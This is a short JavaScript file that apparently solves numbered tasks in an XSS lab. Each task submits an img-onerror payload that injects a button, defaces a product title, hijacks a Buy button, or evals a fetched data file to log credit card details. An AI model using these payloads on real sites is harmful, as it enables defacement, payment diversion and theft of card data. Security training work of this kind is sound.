// Helper function to automatically inject and submit an XSS payload
function autoInject(payload) {
    const textArea = document.getElementById('text-area');
    const submitButton = document.querySelector('.form-btn');
    textArea.value = payload;
    submitButton.click();
}

// Task 1: Create a button that logs "You have been hacked"
document.getElementById('text-area').value = '<img src="X" onerror="const btn=document.createElement(\'button\'); btn.innerHTML=\'Click Me!\'; btn.onclick=function(){console.log(\'You have been hacked 🏴‍☠️\')}; document.body.appendChild(btn)">'; document.querySelector('.form-btn').click();

// Task 2: Change the product title
document.getElementById('text-area').value = '<img src="X" onerror="document.querySelector(\'.prod-title\').innerHTML=\'Do not buy this\'">'; document.querySelector('.form-btn').click();

// Task 4: Hijack Buy button
document.getElementById('text-area').value = '<img src="X" onerror="document.getElementById(\'prod-buy\').onclick=function(){console.log(\'diverting payment to my account 💰\'); return false;}">'; document.querySelector('.form-btn').click();

// Task 5: Log credit card details
document.getElementById('text-area').value = '<img src="X" onerror="fetch(\'data.js\').then(r=>r.text()).then(t=>console.log(\'Credit Card Details:\', eval(t)))">'; document.querySelector('.form-btn').click();